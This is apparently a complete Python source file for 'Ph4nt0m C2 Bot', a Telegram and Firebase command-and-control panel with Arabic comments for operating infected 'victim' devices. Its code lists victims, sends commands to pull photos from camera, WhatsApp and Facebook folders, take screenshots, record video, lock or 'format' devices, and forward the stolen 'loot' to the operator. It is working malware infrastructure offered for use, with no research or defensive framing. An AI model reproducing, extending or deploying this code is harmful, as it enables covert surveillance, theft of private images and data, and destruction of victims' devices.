#!/usr/bin/env python3
"""
Ph4nt0m C2 Bot - Final Version
يدعم: سحب الصور من مجلدات محددة، قفل الشاشة، معلومات الجهاز، فلاش، فرمتة، مسح الجلسة
"""
import os
import json
import threading
import time
import requests
import base64
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from firebase_admin import credentials, initialize_app, db

# ========== Flask للمنفذ الوهمي ==========
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "System Active"

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    flask_app.run(host='0.0.0.0', port=port)

# ========== إعدادات Firebase ==========
BOT_TOKEN = os.environ["BOT_TOKEN"]
FIREBASE_URL = os.environ["FIREBASE_URL"]

firebase_creds = os.environ.get("FIREBASE_CREDS")
if firebase_creds:
    cred = credentials.Certificate(json.loads(firebase_creds))
    initialize_app(cred, {'databaseURL': FIREBASE_URL})
else:
    initialize_app(options={'databaseURL': FIREBASE_URL})

victims_ref = db.reference('victims')
current_victim = {}  # user_id -> victim_id

# ========== دوال مساعدة ==========
def get_online_victims():
    snap = victims_ref.get()
    if not snap:
        return {}
    return {k: v for k, v in snap.items() if v.get('online')}

async def send_file_to_telegram(update, data_bytes, filename, caption):
    try:
        await update.message.reply_document(document=data_bytes, filename=filename, caption=caption)
    except:
        pass

async def send_latest_loot(update, vid):
    """إرسال أحدث 5 مسروقات تلقائياً"""
    loot = db.reference(f'victims/{vid}/loot').get()
    if not loot:
        await update.message.reply_text("لا توجد مسروقات بعد.")
        return
    items = list(loot.items())[-5:]
    count = 0
    for key, item in items:
        typ = item.get('type', '?')
        name = item.get('name', typ)
        url = item.get('url')
        data_b64 = item.get('data')
        info = item.get('info')

        if info:
            # معلومات الجهاز
            await update.message.reply_text(
                f"📋 **معلومات الجهاز:**\n"
                f"🔹 النظام: {info.get('plat', '?')}\n"
                f"🔹 المتصفح: {info.get('ua', '?')[:60]}...\n"
                f"🔹 IP: {info.get('ip', '?')}\n"
                f"🔹 البطارية: {info.get('battery', '?')} | شحن: {'نعم' if info.get('charging') else 'لا'}\n"
                f"🔹 اللغة: {info.get('language', '?')}\n"
                f"🔹 الشاشة: {info.get('scr', '?')}\n"
                f"🔹 الذاكرة: {info.get('mem', '?')} GB | الأنوية: {info.get('cores', '?')}"
            )
            count += 1
            continue

        if url:
            try:
                r = requests.get(url)
                if r.status_code == 200:
                    ext = 'png' if typ in ('screenshot', 'stealth_photo', 'photo') else 'webm' if typ == 'video' else 'bin'
                    await send_file_to_telegram(update, r.content, f"{name}.{ext}", f"📎 {name}")
                    count += 1
            except:
                pass
        elif data_b64:
            try:
                await send_file_to_telegram(update, base64.b64decode(data_b64), f"{name}.bin", f"📎 {name}")
                count += 1
            except:
                pass
    if count == 0:
        await update.message.reply_text("لا توجد ملفات قابلة للعرض حالياً.")

# ========== لوحات الأزرار ==========
def get_victims_keyboard():
    keyboard = []
    vics = get_online_victims()
    for vid, info in vics.items():
        fg = info.get('fingerprint', {})
        label = f"🖥 {vid} ({fg.get('plat', '?')})"
        keyboard.append([InlineKeyboardButton(label, callback_data=f'select_{vid}')])
    keyboard.append([
        InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims'),
        InlineKeyboardButton("🗑️ مسح الكل", callback_data='delete_all_victims')
    ])
    return InlineKeyboardMarkup(keyboard)

def get_control_keyboard():
    keyboard = [
        [InlineKeyboardButton("📷 سحب الصور", callback_data='photo_menu'),
         InlineKeyboardButton("📁 سحب الملفات", callback_data='folder_downloads')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot'),
         InlineKeyboardButton("🎥 فيديو 10ث", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'),
         InlineKeyboardButton("🔊 صوت", callback_data='play_sound')],
        [InlineKeyboardButton("🔦 فلاش تشغيل", callback_data='flash_on'),
         InlineKeyboardButton("💡 فلاش إطفاء", callback_data='flash_off')],
        [InlineKeyboardButton("📋 معلومات الجهاز", callback_data='device_info')],
        [InlineKeyboardButton("🔒 قفل الشاشة", callback_data='lock_screen')],
        [InlineKeyboardButton("💣 فرمتة", callback_data='format'),
         InlineKeyboardButton("🚫 مسح الجلسة", callback_data='leave')],
        [InlineKeyboardButton("🔙 رجوع للضحايا", callback_data='back_to_victims')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_photo_folders_keyboard():
    keyboard = [
        [InlineKeyboardButton("📸 الكاميرا", callback_data='folder_camera')],
        [InlineKeyboardButton("📥 التنزيلات", callback_data='folder_downloads')],
        [InlineKeyboardButton("💬 واتساب", callback_data='folder_whatsapp')],
        [InlineKeyboardButton("👤 فيسبوك", callback_data='folder_facebook')],
        [InlineKeyboardButton("🖼️ معرض الصور", callback_data='folder_pictures')],
        [InlineKeyboardButton("📁 جميع المجلدات", callback_data='folder_all')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back_to_control')]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== الأوامر ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ **Ph4nt0m C2 - Ready**",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📟 عرض الضحايا المتصلين", callback_data='show_victims')]
        ])
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data

    # ========== عرض القائمة / رجوع ==========
    if data in ('show_victims', 'back_to_victims', 'refresh_victims'):
        vics = get_online_victims()
        if not vics:
            await query.edit_message_text("لا توجد أجهزة متصلة حالياً.", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims')]
            ]))
            return
        await query.edit_message_text("📟 **الضحايا المتصلين:**", reply_markup=get_victims_keyboard())
        if current_victim.get(uid):
            del current_victim[uid]
        return

    # ========== مسح جميع الأجهزة ==========
    if data == 'delete_all_victims':
        victims_ref.delete()
        if current_victim.get(uid):
            del current_victim[uid]
        await query.edit_message_text("🗑️ تم مسح جميع الأجهزة.", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]
        ]))
        return

    # ========== اختيار ضحية ==========
    if data.startswith('select_'):
        vid = data.split('_', 1)[1]
        vics = get_online_victims()
        if vid not in vics:
            await query.edit_message_text("الجهاز غير متصل الآن.", reply_markup=get_victims_keyboard())
            return
        current_victim[uid] = vid
        fg = vics[vid].get('fingerprint', {})
        await query.edit_message_text(
            f"✅ **الجهاز:** `{vid}`\n📱 النظام: {fg.get('plat', '?')}",
            reply_markup=get_control_keyboard()
        )
        return

    # ========== التحقق من جلسة ==========
    vid = current_victim.get(uid)
    if not vid:
        await query.edit_message_text("انتهت الجلسة. اختر جهازاً:", reply_markup=get_victims_keyboard())
        return

    # ========== مسح جلسة جهاز ==========
    if data == 'leave':
        victims_ref.child(vid).delete()
        if current_victim.get(uid) == vid:
            del current_victim[uid]
        await query.edit_message_text("🚫 تم مسح الجلسة والجهاز.", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]
        ]))
        return

    # ========== قائمة المجلدات ==========
    if data == 'photo_menu':
        await query.edit_message_text("اختر مجلد الصور:", reply_markup=get_photo_folders_keyboard())
        return

    if data.startswith('folder_'):
        folder_key = data.split('_', 1)[1]
        if folder_key == 'all':
            cmd = {"action": "get_photos"}
            await query.edit_message_text("✅ جاري سحب جميع الصور...", reply_markup=get_control_keyboard())
        else:
            cmd = {"action": "get_photos", "folder": folder_key}
            await query.edit_message_text(f"✅ جاري سحب صور: {folder_key}", reply_markup=get_control_keyboard())
        db.reference(f'victims/{vid}/command').set(cmd)
        time.sleep(3)
        await send_latest_loot(query, vid)
        return

    if data == 'back_to_control':
        await query.edit_message_text("لوحة التحكم:", reply_markup=get_control_keyboard())
        return

    # ========== معلومات الجهاز ==========
    if data == 'device_info':
        db.reference(f'victims/{vid}/command').set({"action": "device_info"})
        await query.edit_message_text("✅ جاري جمع معلومات الجهاز...", reply_markup=get_control_keyboard())
        time.sleep(2)
        await send_latest_loot(query, vid)
        return

    # ========== الأوامر التنفيذية ==========
    params = {}
    if data == 'vibrate':
        params['duration'] = 5000
    elif data == 'record_video':
        params['duration'] = 10

    cmd = {"action": data, **params}
    db.reference(f'victims/{vid}/command').set(cmd)
    await query.edit_message_text(f"✅ تم إرسال الأمر: {data}", reply_markup=get_control_keyboard())

    # إرسال المسروقات تلقائياً بعد أوامر اللقطات
    if data in ('screenshot', 'folder_downloads'):
        time.sleep(3)
        await send_latest_loot(query, vid)

# ========== التشغيل ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("🤖 Ph4nt0m Bot Started...")
    app.run_polling()

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    main()
